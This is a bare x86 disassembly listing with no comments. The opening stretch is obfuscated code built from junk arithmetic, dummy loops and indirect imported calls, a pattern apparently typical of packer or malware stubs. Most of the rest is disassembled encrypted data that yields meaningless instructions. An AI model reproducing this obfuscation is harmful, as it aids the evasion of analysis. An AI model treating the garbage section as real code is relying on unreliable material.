  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42a9ef
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42a9f3
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42a9fb
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	test   DWORD PTR [eax+0x44f90227],edi
  416a67:	add    BYTE PTR [ebx-0x7c7c9f19],0x19
  416a6e:	mov    BYTE PTR [ebp-0x37ffc23d],bh
  416a74:	jp     0x416a0c
  416a76:	xchg   ebp,eax
  416a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a78:	push   ds
  416a79:	pop    es
  416a7a:	mov    edi,0xec690ecc
  416a7f:	inc    ecx
  416a80:	inc    esp
  416a81:	and    bh,BYTE PTR [edx]
  416a83:	pop    ebx
  416a84:	(bad)  
  416a85:	xlat   BYTE PTR ds:[ebx]
  416a86:	add    ebp,0x415eec6f
  416a8c:	mov    al,ds:0x7ac1e7
  416a91:	in     eax,0x91
  416a93:	pushw  0x86b7
  416a97:	cmp    ebx,DWORD PTR [edi+0x7b]
  416a9a:	mov    ds:0xf810d23b,eax
  416a9f:	inc    ebp
  416aa0:	test   al,0x41
  416aa2:	sbb    al,0x87
  416aa4:	push   ds
  416aa5:	push   esp
  416aa6:	sti    
  416aa7:	jbe    0x416aaa
  416aa9:	neg    BYTE PTR [esi+0x16]
  416aac:	or     WORD PTR [ecx-0x6856da18],dx
  416ab3:	mov    al,0x30
  416ab5:	pop    ebx
  416ab6:	sti    
  416ab7:	inc    ebx
  416ab8:	pop    ecx
  416ab9:	and    edx,DWORD PTR ds:0x36d267fa
  416abf:	push   esi
  416ac0:	int3   
  416ac1:	sbb    esp,esi
  416ac3:	jg     0x416a95
  416ac5:	sahf   
  416ac6:	push   edx
  416ac7:	or     al,0xf9
  416ac9:	push   ss
  416aca:	repnz push eax
  416acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416acd:	retf   0x9dcc
  416ad0:	mov    ebp,DWORD PTR [ebx+edx*2]
  416ad3:	loop   0x416ad5
  416ad5:	and    esi,DWORD PTR [ecx-0x182a52ac]
  416adb:	mov    BYTE PTR [eax+0x50],cl
  416ade:	stc    
  416adf:	jo     0x416a71
  416ae1:	push   cs
  416ae2:	or     bh,BYTE PTR [ecx+0x4a893eb3]
  416ae8:	xchg   DWORD PTR [edi],edx
  416aea:	lods   eax,DWORD PTR ds:[esi]
  416aeb:	mov    eax,ds:0x8ec17696
  416af0:	push   ebx
  416af1:	mov    dl,ch
  416af3:	shl    DWORD PTR [si],0x78
  416af7:	jl     0x416aa4
  416af9:	jnp    0x416b23
  416afb:	(bad)  
  416afc:	cmc    
  416afd:	xchg   esp,ebx
  416aff:	dec    edi
  416b00:	std    
  416b01:	hlt    
  416b02:	aad    0xc5
  416b04:	test   BYTE PTR [edi],ah
  416b06:	test   eax,0x3d276a5f
  416b0b:	in     eax,0x50
  416b0d:	jne    0x416b5b
  416b0f:	and    eax,0xf40b6bae
  416b14:	fsub   DWORD PTR [eax-0x44]
  416b17:	call   0x393b:0x7bd4fef4
  416b1e:	aas    
  416b1f:	add    ch,dl
  416b21:	div    BYTE PTR [ebp-0x11638922]
  416b27:	mov    bh,0xe4
  416b29:	rcl    DWORD PTR [eax+0x6e],cl
  416b2c:	addr16 fcmovnu st,st(6)
  416b2f:	push   eax
  416b30:	pushf  
  416b31:	loope  0x416b24
  416b33:	ins    BYTE PTR es:[edi],dx
  416b34:	lods   al,BYTE PTR ds:[esi]
  416b35:	push   0x7083d811
  416b3a:	mov    DWORD PTR [ebp+eiz*4-0x6a],ecx
  416b3e:	inc    edi
  416b3f:	popf   
  416b40:	lods   al,BYTE PTR ds:[esi]
  416b41:	aaa    
  416b42:	and    DWORD PTR [ebp+0x30],ebx
  416b45:	mov    eax,ds:0x252adc5a
  416b4a:	xor    BYTE PTR [edi+0x10],dh
  416b4d:	(bad)  
  416b4e:	mov    ebp,0x47f66911
  416b53:	in     eax,dx
  416b54:	pusha  
  416b55:	pop    ebp
  416b56:	pop    eax
  416b57:	dec    edx
  416b58:	add    al,0xa4
  416b5a:	xchg   esp,eax
  416b5b:	rol    BYTE PTR cs:[eax+0x35],0x3e
  416b60:	xchg   BYTE PTR [edi-0x57],al
  416b63:	scas   eax,DWORD PTR es:[edi]
  416b64:	out    dx,eax
  416b65:	xlat   BYTE PTR ds:[ebx]
  416b66:	sbb    al,0xe0
  416b68:	inc    ebp
  416b69:	sar    BYTE PTR [esi+0x1f],0x9e
  416b6d:	dec    edi
  416b6e:	mov    cl,0x6e
  416b70:	retf   0xa47b
  416b73:	jecxz  0x416b95
  416b75:	add    DWORD PTR [ebx-0x4e],0xe0010df8
  416b7c:	jmp    0x313d:0x18a0f72e
  416b83:	jg     0x416bf5
  416b85:	(bad)  
  416b86:	sbb    ebp,edi
  416b88:	(bad)  
  416b89:	ret    0x32c1
  416b8c:	inc    eax
  416b8d:	aam    0xc8
  416b8f:	sub    al,0x2
  416b91:	jmp    0x8b19:0x3daef883
  416b98:	dec    ebp
  416b99:	ins    BYTE PTR es:[edi],dx
  416b9a:	mov    DWORD PTR [edx-0x76],ecx
  416b9d:	xor    DWORD PTR [esi+0x47],edi
  416ba0:	test   DWORD PTR [eax],edi
  416ba2:	add    DWORD PTR [ecx-0x1f4b0d6e],ecx
  416ba8:	in     al,0x44
  416baa:	mov    dh,0x88
  416bac:	or     BYTE PTR [edx+0x518edea3],0x67
  416bb3:	out    0xff,eax
  416bb5:	add    ch,0x9b
  416bb8:	mov    edi,0xd05e3c90
  416bbd:	lods   eax,DWORD PTR ds:[esi]
  416bbe:	or     eax,0xffe9f3a0
  416bc3:	pop    ds
  416bc4:	stc    
  416bc5:	adc    DWORD PTR [esi+esi*8],ecx
  416bc8:	stc    
  416bc9:	jne    0x416ba6
  416bcb:	sbb    DWORD PTR [edx+0x2b0e23ac],edi
  416bd1:	ins    BYTE PTR es:[edi],dx
  416bd2:	stos   BYTE PTR es:[edi],al
  416bd3:	clc    
  416bd4:	cwde   
  416bd5:	or     esp,DWORD PTR [edi-0x50f82ef8]
  416bdb:	lahf   
  416bdc:	(bad)  
  416bdd:	(bad)  
  416bde:	ds test al,0x29
  416be1:	jmp    0x416c3f
  416be3:	sahf   
  416be4:	add    DWORD PTR [edi],0x36
  416be7:	fs push edi
  416be9:	sub    ebx,ebx
  416beb:	test   ch,ch
  416bed:	mov    DWORD PTR [esi+edx*8],eax
  416bf0:	mov    ebp,0x965048ff
  416bf5:	and    ah,al
  416bf7:	adc    eax,0x13ec48e6
  416bfc:	fs repz das 
  416bff:	or     al,0xda
  416c01:	mov    dh,ch
  416c03:	outs   dx,DWORD PTR ds:[esi]
  416c05:	and    eax,0x5c6d3d3c
  416c0a:	pop    eax
  416c0b:	js     0x416c7a
  416c0d:	and    eax,0xda22591e
  416c12:	cmp    ebp,eax
  416c14:	or     DWORD PTR [ecx+0x757778d8],ecx
  416c1a:	adc    ebx,DWORD PTR [eax+0x6a593f04]
  416c20:	jmp    0x416c92
  416c22:	jmp    0x44c5dbe0
  416c27:	pop    es
  416c28:	dec    esp
  416c29:	or     edx,DWORD PTR [ebx-0x3adf845e]
  416c2f:	add    bh,BYTE PTR [ebp+ecx*1-0x5c9f04d9]
  416c36:	icebp  
  416c37:	and    ecx,0xffffffcf
  416c3a:	xor    dh,BYTE PTR [esi+ebp*2]
  416c3d:	retf   0x402
  416c40:	call   0x1c2d:0x6a19739b
  416c47:	test   edi,0x255325f6
  416c4d:	mov    cl,0x99
  416c4f:	xor    eax,0xaabddcd2
  416c54:	outs   dx,BYTE PTR ds:[si]
  416c56:	test   DWORD PTR [ebp+0x4],0xbf2c7f23
  416c5d:	aad    0x33
  416c5f:	into   
  416c60:	xchg   DWORD PTR [ebp-0x56],eax
  416c63:	jae    0x416c58
  416c65:	call   0xaea8922f
  416c6a:	cmp    DWORD PTR [ebx+0x2343fce3],0x2a
  416c71:	pop    ds
  416c72:	sbb    esp,eax
  416c74:	pop    ds
  416c75:	jle    0x416c22
  416c77:	mov    WORD PTR [ecx-0x56fa1033],cs
  416c7d:	jecxz  0x416cc5
  416c7f:	pop    ebp
  416c80:	push   ds
  416c81:	add    edi,DWORD PTR [ebx+0x34]
  416c84:	sbb    eax,0xdb0edacb
  416c89:	mov    ebx,0xc9c2468b
  416c8e:	lods   al,BYTE PTR ds:[esi]
  416c8f:	lahf   
  416c90:	push   ds
  416c91:	mov    esp,0xe51a123
  416c96:	mov    dl,0x63
  416c98:	loope  0x416c4f
  416c9a:	sub    al,0xaa
  416c9c:	ret    
  416c9d:	add    al,0x6a
  416c9f:	div    DWORD PTR [ebx]
  416ca1:	xchg   esi,eax
  416ca2:	cmp    dl,BYTE PTR [ebx+0xb049a6]
  416ca8:	lock je 0x416c8d
  416cab:	test   al,0xd
  416cad:	cmp    edi,eax
  416caf:	imul   esp,DWORD PTR [ebp+0x78d04e18],0x55bebc1c
  416cb9:	jl     0x416c87
  416cbb:	xchg   edi,eax
  416cbc:	lea    ebx,[ebx-0x4814486e]
  416cc2:	mov    bl,0x98
  416cc4:	mov    ebp,0x4e5bfc3
  416cc9:	mov    al,0xfb
  416ccb:	arpl   WORD PTR [ebx-0x63],cx
  416cce:	popf   
  416ccf:	mov    esp,0xd1a2cc7b
  416cd4:	ds inc edx
  416cd6:	loopne 0x416c59
  416cd8:	rol    esi,0x5e
  416cdb:	loope  0x416d47
  416cdd:	adc    bh,BYTE PTR [ebp+0x704a1cb]
  416ce3:	push   ds
  416ce4:	cmp    ebx,DWORD PTR [edx-0x7b6875b8]
  416cea:	inc    ecx
  416ceb:	xchg   ecx,eax
  416cec:	retf   0x56e1
  416cef:	lods   eax,DWORD PTR ds:[esi]
  416cf0:	(bad)  
  416cf1:	bound  esi,QWORD PTR [eax]
  416cf3:	js     0x416cf7
  416cf5:	add    dh,bh
  416cf7:	int    0x7c
  416cf9:	mov    esi,0xb0d6114b
  416cfe:	add    edi,esi
  416d00:	or     al,0xe6
  416d02:	mov    eax,ds:0x8e07d22
  416d07:	hlt    
  416d08:	sbb    al,0x60
  416d0a:	sbb    dl,al
  416d0c:	push   esp
  416d0d:	mov    cl,0xe4
  416d0f:	sahf   
  416d10:	mov    DWORD PTR [ecx],ebx
  416d12:	mov    dh,0xaf
  416d14:	and    ah,BYTE PTR [eax+0x17]
  416d17:	inc    edx
  416d18:	fwait
  416d19:	call   0xc73b:0xfc2bb510
  416d20:	xchg   esp,eax
  416d21:	jp     0x416d02
  416d23:	or     eax,0x20170bb6
  416d28:	dec    edi
  416d29:	push   ds
  416d2a:	adc    ebp,esi
  416d2c:	jecxz  0x416d44
  416d2e:	stc    
  416d2f:	ficomp WORD PTR [edx]
  416d31:	pop    esi
  416d32:	inc    ebx
  416d33:	inc    edi
  416d34:	mov    eax,ds:0xee945610
  416d39:	add    bh,BYTE PTR [esi+0x58e71bbe]
  416d3f:	inc    esi
  416d40:	mov    bl,0x94
  416d42:	lea    esi,[esi]
  416d44:	pop    es
  416d45:	cmp    eax,0xa69cb997
  416d4a:	lock (bad) 
  416d4d:	xor    cl,ch
  416d4f:	enter  0xab0e,0xa1
  416d53:	or     al,BYTE PTR [esi]
  416d55:	repnz adc DWORD PTR [esi-0x51],esp
  416d59:	imul   edi,DWORD PTR [ecx+0x49ffb558],0x42925576
  416d63:	add    DWORD PTR [ebx],0x8c3d780b
  416d69:	(bad)  
  416d6a:	fbld   TBYTE PTR [edx-0x28]
  416d6d:	mov    BYTE PTR [eax+ebx*8+0x73e8475a],0x8b
  416d75:	mov    dh,0x32
  416d77:	fidivr DWORD PTR [ebx]
  416d79:	call   0x8d6fe380
  416d7e:	imul   edx,DWORD PTR [edx-0x4481d5e],0xd5bcaca1
  416d88:	dec    esp
  416d89:	jmp    FWORD PTR [ebp-0xd]
  416d8c:	sbb    BYTE PTR [ebx-0x1e],cl
  416d8f:	pop    ebp
  416d90:	repz je 0x416d19
  416d93:	push   es
  416d94:	push   es
  416d95:	xchg   BYTE PTR [ecx],al
  416d97:	mov    esp,0xd74ef01a
  416d9c:	xor    eax,ebx
  416d9e:	push   esp
  416d9f:	and    edx,DWORD PTR [edi-0x3910efce]
  416da5:	jno    0x416d4c
  416da7:	mov    al,BYTE PTR [edx+0xc371aa2]
  416dad:	mov    ch,al
  416daf:	outs   dx,BYTE PTR ds:[esi]
  416db0:	xor    ah,BYTE PTR [ecx]
  416db2:	sub    cl,BYTE PTR [edi*8-0x6184c04e]
  416db9:	test   eax,0xf9abd245
  416dbe:	mov    ch,0x8b
  416dc0:	fadd   DWORD PTR [ecx+esi*2-0x28]
  416dc4:	mov    ah,BYTE PTR [eax+0x79b9e21e]
  416dca:	imul   ecx,DWORD PTR [esi-0x11],0xc
  416dce:	mov    dh,0xcd
  416dd0:	pop    edi
  416dd1:	fwait
  416dd2:	sbb    DWORD PTR [edx+ebx*8+0x40],eax
  416dd6:	mov    edi,0xbc3dd6cb
  416ddb:	mov    eax,0x7e2e5b88
  416de0:	pop    edx
  416de1:	out    0x88,eax
  416de3:	and    al,0xa4
  416de5:	rcr    BYTE PTR ds:0x8fd47300,cl
  416deb:	pusha  
  416dec:	mov    ebp,edx
  416dee:	js     0x416e3b
  416df0:	push   0xffffffe8
  416df2:	dec    ebx
  416df3:	rol    bl,cl
  416df5:	fmul   QWORD PTR cs:[eax]
  416df8:	xchg   esi,eax
  416df9:	in     al,dx
  416dfa:	cs fs leave 
  416dfd:	mov    al,ds:0x77b45075
  416e02:	sahf   
  416e03:	cmp    eax,0x7b5ad3dc
  416e08:	cmp    eax,0x18c6b2c7
  416e0d:	mov    ecx,0x1ac64eea
  416e12:	adc    BYTE PTR [ecx+esi*8-0x76],ch
  416e16:	iret   
  416e17:	sbb    esi,edx
  416e19:	push   cs
  416e1a:	les    ebp,FWORD PTR [ecx]
  416e1c:	pop    ds
  416e1d:	and    edx,DWORD PTR [ebp+0x296b3577]
  416e23:	ds xor al,0xe1
  416e26:	jmp    0x416e39
  416e28:	ins    BYTE PTR es:[edi],dx
  416e29:	not    DWORD PTR [ebp+0x30]
  416e2c:	data16 jp 0x416e6f
  416e2f:	add    al,0xcc
  416e31:	aam    0xd5
  416e33:	lods   al,BYTE PTR ds:[esi]
  416e34:	mov    BYTE PTR [esi-0x6a028007],bh
  416e3a:	ins    BYTE PTR es:[edi],dx
  416e3b:	cmp    al,0x42
  416e3d:	xchg   bh,ch
  416e3f:	fwait
  416e40:	mov    al,0xec
  416e42:	pop    esp
  416e43:	aad    0xf2
  416e45:	pusha  
  416e46:	das    
  416e47:	repz int 0x7e
  416e4a:	in     al,dx
  416e4b:	sub    dl,BYTE PTR [ecx]
  416e4d:	mov    bl,0x4
  416e4f:	add    eax,0x34f30523
  416e54:	mov    edi,0x6114a72c
  416e59:	dec    ebp
  416e5a:	jl     0x416e30
  416e5c:	(bad)  
  416e5d:	xchg   ebp,eax
  416e5e:	hlt    
  416e5f:	inc    ebx
  416e60:	or     cl,ch
  416e62:	ret    0x4dd8
  416e65:	pop    ss
  416e66:	imul   ebx,DWORD PTR [ebx-0x67],0xffffff85
  416e6a:	push   ss
  416e6b:	pop    edi
  416e6c:	mov    al,ds:0x4440e014
  416e71:	(bad)  
  416e72:	int3   
  416e73:	test   eax,0xb7be03a7
  416e78:	or     al,0x61
  416e7a:	ret    0x84a6
  416e7d:	es ja  0x416e80
  416e80:	outs   dx,DWORD PTR ds:[esi]
  416e81:	mov    ecx,0x8c42c81e
  416e86:	pop    esi
  416e87:	or     eax,0x53472e17
  416e8c:	pop    ds
  416e8d:	arpl   WORD PTR [ebp+0x7b],di
  416e90:	dec    ecx
  416e91:	ja     0x416e57
  416e93:	addr16 xor al,0x97
  416e96:	mov    DWORD PTR [edx+0x69df662a],edi
  416e9c:	mov    ah,0xf4
  416e9e:	cld    
  416e9f:	icebp  
  416ea0:	cli    
  416ea1:	xchg   esp,eax
  416ea2:	push   ecx
  416ea3:	mov    al,ds:0x211eb5d7
  416ea8:	and    ebp,DWORD PTR [eax-0x6b]
  416eab:	mov    dh,BYTE PTR [esi-0x8]
  416eae:	ffree  st(4)
  416eb0:	lock jge 0x416e78
  416eb3:	add    DWORD PTR [esi],0x646147e6
  416eb9:	xor    al,0xb8
  416ebb:	scas   al,BYTE PTR es:[edi]
  416ebc:	lock pop esp
  416ebe:	inc    ecx
  416ebf:	mov    ?,WORD PTR [ecx]
  416ec1:	push   es
  416ec2:	pop    es
  416ec3:	sub    cl,BYTE PTR [ebx-0x64]
  416ec6:	sbb    BYTE PTR [esi-0x4f3c2a6a],0xed
  416ecd:	pushf  
  416ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ecf:	jb     0x416e5f
  416ed1:	jle    0x416f0b
  416ed3:	push   edi
  416ed4:	cmp    BYTE PTR [eax],al
  416ed6:	(bad)  
  416ed7:	sub    cl,ch
  416ed9:	xor    edi,DWORD PTR [ebp+eax*2+0xe]
  416edd:	test   al,0x79
  416edf:	sub    al,0x28
  416ee1:	es push ss
  416ee3:	push   eax
  416ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ee5:	and    eax,0xb2ebc2dc
  416eea:	mov    ebx,0xa02c6293
  416eef:	out    0xb3,al
  416ef1:	inc    eax
  416ef2:	lods   eax,DWORD PTR ds:[esi]
  416ef3:	and    eax,0xa3b3ea20
  416ef8:	lods   eax,DWORD PTR ds:[esi]
  416ef9:	addr16 sbb al,0xf2
  416efc:	jne    0x416f7a
  416efe:	jecxz  0x416f4d
  416f00:	loop   0x416f20
  416f02:	pop    ss
  416f03:	adc    ecx,DWORD PTR [esi+0x75]
  416f06:	sahf   
  416f07:	arpl   WORD PTR [esi],cx
  416f09:	cdq    
  416f0a:	shl    DWORD PTR [eax+ecx*2],1
  416f0d:	fild   DWORD PTR [edx+0x6a07fbd7]
  416f13:	or     eax,0xc12031e
  416f18:	mov    edi,0xf8a60e3a
  416f1d:	pop    esp
  416f1e:	mov    al,ds:0x9b3ee36c
  416f23:	dec    ebp
  416f24:	frstor [ebx-0x216b4cc5]
  416f2a:	cs push 0xffffffb5
  416f2d:	loopne 0x416f13
  416f2f:	xchg   edx,eax
  416f30:	push   ebx
  416f31:	push   ds
  416f32:	std    
  416f33:	fwait
  416f34:	into   
  416f35:	ss push cs
  416f37:	scas   eax,DWORD PTR es:[edi]
  416f38:	push   ss
  416f39:	shl    cl,1
  416f3b:	dec    ebp
  416f3c:	lds    esp,FWORD PTR [eax+0x15]
  416f3f:	cli    
  416f40:	sbb    ebp,DWORD PTR [esi-0x5c35c892]
  416f46:	aam    0x33
  416f48:	inc    BYTE PTR [ecx+0x7e]
  416f4b:	ret    0xe460
  416f4e:	xor    dh,dh
  416f50:	test   eax,0x5c3e2e5f
  416f55:	xchg   BYTE PTR [ebx+0x78d75426],ah
  416f5b:	xchg   ecx,eax
  416f5c:	je     0x416f64
  416f5e:	mov    bl,0x45
  416f60:	jp     0x416f6e
  416f62:	(bad)  
  416f63:	pop    edx
  416f64:	in     al,dx
  416f65:	loopne 0x416f58
  416f67:	push   edx
  416f68:	mov    ds:0x8a223842,al
  416f6d:	imul   ebx,DWORD PTR [esp+ecx*8-0x43f6ea6a],0x2a
  416f75:	cmp    eax,0x1531ad16
  416f7a:	cwde   
  416f7b:	sub    ebp,esp
  416f7d:	push   0xb36346e3
  416f82:	into   
  416f83:	(bad)  
  416f84:	jg     0x416f45
  416f86:	out    0xfc,eax
  416f88:	push   ds
  416f89:	dec    ecx
  416f8a:	pop    edx
  416f8b:	inc    edx
  416f8c:	inc    cx
  416f8e:	popf   
  416f8f:	shl    DWORD PTR [edx-0x4c2eec6e],1
  416f95:	mov    al,0x2d
  416f97:	push   cs
  416f98:	shl    BYTE PTR [esi-0x33],0xb8
  416f9c:	das    
  416f9d:	es sub dh,al
  416fa0:	sub    eax,0x659f6b95
  416fa5:	enter  0xbf7c,0x41
  416fa9:	nop
  416faa:	imul   ebp,DWORD PTR [esi],0x81558b44
  416fb0:	repnz jecxz 0x41701b
  416fb3:	rcl    DWORD PTR [ebx],1
  416fb5:	push   0x78b4cf97
  416fba:	pop    ebx
  416fbb:	fld    TBYTE PTR [ebx]
  416fbd:	inc    ecx
  416fbe:	arpl   WORD PTR [edi-0x7da7a19f],cx
  416fc4:	inc    eax
  416fc5:	jmp    0x75f8db1e
  416fca:	test   eax,0xe79f5623
  416fcf:	jmp    0x416f67
  416fd1:	xor    eax,0xadbce015
  416fd6:	cmp    ah,BYTE PTR [edi+0xa]
  416fd9:	mov    ch,0x61
  416fdb:	mov    cl,BYTE PTR [ecx-0xa]
  416fde:	test   eax,0x9815cf93
  416fe3:	imul   edx,DWORD PTR [edi+0x5fadc543],0x7a
  416fea:	xor    BYTE PTR [esi-0x5e],bl
  416fed:	sbb    al,0x63
  416fef:	add    bh,BYTE PTR [eax+0x3b]
  416ff2:	sbb    ecx,esi
  416ff4:	sbb    DWORD PTR [ebx-0x114d8f8f],0x9fc7e9e
  416ffe:	cmp    al,0x52
  417000:	and    BYTE PTR [edi],bl
  417002:	pushf  
  417003:	and    edx,DWORD PTR ds:0xa9eb9245
  417009:	outs   dx,DWORD PTR ds:[esi]
  41700a:	sub    edi,DWORD PTR [eax]
  41700c:	adc    ax,cx
  41700f:	add    ebx,DWORD PTR [edi]
  417011:	sub    dh,cl
  417013:	aaa    
  417014:	popa   
  417015:	test   al,0xe8
  417017:	xchg   edx,eax
  417018:	ins    DWORD PTR es:[edi],dx
  417019:	mov    eax,0x73f38fb2
  41701e:	jp     0x416fe3
  417020:	dec    eax
  417021:	stos   DWORD PTR es:[edi],eax
  417022:	jecxz  0x41702c
  417024:	push   edx
  417025:	xchg   ebp,eax
  417026:	xor    al,0xd8
  417028:	aam    0x84
  41702a:	pop    edi
  41702b:	adc    al,0xf9
  41702d:	pop    ebp
  41702e:	adc    dl,bh
  417030:	dec    edi
  417031:	ficom  DWORD PTR [edi+0x4]
  417034:	pop    esp
  417035:	mov    ebx,0xe87eeffa
  41703a:	repz xlat BYTE PTR ds:[ebx]
  41703c:	adc    DWORD PTR es:[ecx-0x7c],esi
  417040:	add    DWORD PTR [ebx],ebp
  417042:	xchg   BYTE PTR [edi+0x40],bl
  417045:	lods   eax,DWORD PTR ds:[esi]
  417046:	inc    ebx
  417047:	jo     0x416ffb
  417049:	jge    0x417052
  41704b:	and    eax,0xceacce32
  417050:	push   esp
  417051:	pop    edi
  417052:	push   es
  417053:	mov    bh,0x13
  417055:	jge    0x4170a6
  417057:	test   al,0xa9
  417059:	data16 mov BYTE PTR [eax],cl
  41705c:	je     0x41704e
  41705e:	pop    edx
  41705f:	cmp    eax,0xec6e06b8
  417064:	xchg   edi,eax
  417065:	out    0xfc,eax
  417067:	jecxz  0x4170b1
  417069:	jge    0x417096
  41706b:	psrad  mm4,QWORD PTR [edx-0x6b242c]
  417072:	jg     0x4170f1
  417074:	and    BYTE PTR [ecx-0x36f7259b],ah
  41707a:	push   esi
  41707b:	(bad)  
  41707d:	(bad)  
  41707e:	fmulp  st(7),st
  417080:	stc    
  417081:	pop    ds
  417082:	mov    ?,WORD PTR [edi-0x5]
  417085:	push   ebx
  417086:	dec    eax
  417087:	cmp    BYTE PTR [edx+0x64],bh
  41708a:	pop    eax
  41708b:	mov    ch,0x3b
  41708d:	sbb    dh,BYTE PTR [ebx-0x43]
  417090:	fwait
  417091:	pushf  
  417092:	cdq    
  417093:	ja     0x417033
  417095:	call   0xa8980ec3
  41709a:	inc    edx
  41709b:	xor    al,0x7d
  41709d:	fistp  WORD PTR [eax]
  41709f:	imul   ebx,esi,0x63
  4170a2:	adc    BYTE PTR [edi+0x6b],bh
  4170a5:	or     eax,0x9b91ef4b
  4170aa:	jns    0x417108
  4170ac:	(bad)  
  4170ad:	or     eax,0x91e30bd
  4170b2:	sahf   
  4170b3:	push   ebp
  4170b4:	jb     0x417103
  4170b6:	fstp   TBYTE PTR [edi+0x41f9d2a5]
  4170bc:	mov    ebx,0x10b1b8a2
  4170c1:	jno    0x417078
  4170c3:	push   edx
  4170c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170c5:	sub    al,bl
  4170c7:	clc    
  4170c8:	mov    al,0x76
  4170ca:	inc    ecx
  4170cb:	xchg   ebp,eax
  4170cc:	mov    ebp,0x17286060
  4170d1:	cmp    BYTE PTR [ebp+0x4f],dl
  4170d4:	aaa    
  4170d5:	test   al,0x22
  4170d7:	into   
  4170d8:	jne    0x417121
  4170da:	cmp    DWORD PTR [ecx+eiz*8+0x38837bde],edi
  4170e1:	mov    dh,0x41
  4170e3:	dec    edi
  4170e4:	dec    eax
  4170e5:	adc    BYTE PTR [esi+0x70],dl
  4170e8:	jl     0x417099
